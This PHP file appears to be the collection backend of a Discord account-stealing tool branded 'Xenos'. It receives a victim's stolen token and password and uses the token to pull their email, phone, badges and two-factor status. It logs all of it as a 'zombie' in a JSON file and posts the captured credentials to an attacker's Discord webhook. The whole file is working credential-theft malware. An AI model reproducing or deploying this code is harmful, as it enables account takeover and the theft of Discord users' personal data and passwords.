<?php

if (isset($_GET['token']) && !empty($_GET['token'])) {

    // Init Get User Infos Request
    $handle = curl_init();
    $headr = array();
    $headr[] = "Authorization: " . $_GET['token'];
    $headr[] = "Content-Type: application/json";

    curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($handle, CURLOPT_URL, "https://discordapp.com/api/v6/users/@me");
    curl_setopt($handle, CURLOPT_HTTPHEADER, $headr);

    $response = curl_exec($handle);
    curl_close($handle);
    $data = json_decode($response);

    $badges = array();
    $nitro_badges = array();

    // Get Badges
    if ($data->flags == 1) {
        $badges[] = "staff";
    } else if ($data->flags == 2) {
        $badges[] = "partner";
    } else if ($data->flags == 4) {
        $badges[] = "hypesquad";
    } else if ($data->flags == 8) {
        $badges[] = "bughunter";
    } else if ($data->flags == 64) {
        $badges[] = "bravery";
    } else if ($data->flags == 128) {
        $badges[] = "brilliance";
    } else if ($data->flags == 256) {
        $badges[] = "balance";
    } else if ($data->flags == 512) {
        $badges[] = "early";
    } else if ($data->flags == 131072) {
        $badges[] = "dev";
    }

    // Get Nitro Status
    if ($data->premium_type == 1) {
        $nitro_badges[] = "nitrocl";
    } else if ($data->premium_type == 2) {
        $nitro_badges[] = "nitrocl";
        $nitro_badges[] = "nitroboost";
    }

    if (isset($data->id) && !empty($data->id)) {

        // Put User in Zombies.json
        $file = "../data/zombies.json";
        $contents = file_get_contents($file);
        $json = json_decode($contents, true);

        $json["zombies"][] = array(
            "id" => $data->id,
            "username" => $data->username . "#" . $data->discriminator,
            "avatar" => $data->avatar,
            "email" => $data->email,
            "phone" => $data->phone || "None",
            "badges" => [
                $badges,
                $nitro_badges
            ],
            "password" => $_GET['password'],
            "twofactor" => $data->mfa_enabled,
            "token" => $_GET['token'],
        );

        $json = json_encode($json);
        file_put_contents($file, $json);


        /*
            Send New Zombie to Discord Webhook
        */

        $webhook = "https://discord.com/api/webhooks/XXXXXXXXXXXXXXXXXX/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
        $json_data = json_encode([
            "username" => "Xenos Zombies Hits",
            "avatar_url" => "https://cdn.discordapp.com/attachments/879708966282723359/891371352223780964/xenos.gif",
            "embeds" => [
                [
                    "title" => "\🐺 __New Zombie In Xenos__ \🐺",
                    "description" => "```json\n{\n   \"id\": \"" . $data->id . "\",\n   \"username\": \"" . $data->username . "#" . $data->discriminator . "\",\n   \"avatar\": \"" . $data->avatar. "\",\n   \"email\": \"" . $data->email. "\",\n   \"phone\": \"" . $data->phone. "\",\n   \"premium_type\": \"" . $data->premium_type. "\",\n   \"flags\": \"" . $data->flags. "\",\n   \"password\": \"" . $_GET['password'] . "\",\n   \"twofactor\": \"" . $data->mfa_enabled . "\",\n   \"token\": \"" . $_GET['token'] . "\",\n}\n```",
                    "footer" => [
                        "text" => "Made with ❤️ by KanekiWeb - github.com/KanekiWeb/Xenos",
                        "icon_url" => "https://cdn.discordapp.com/avatars/" . $data->id . "/" . $data->avatar
                    ],
                    "thumbnail" => [
                       "url" => "https://cdn.discordapp.com/avatars/" . $data->id . "/" . $data->avatar
                    ]
                ]
            ]
        
        ]);
        
        
        $ch = curl_init($webhook);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        return curl_exec($ch);
        curl_close($ch);
    }
}
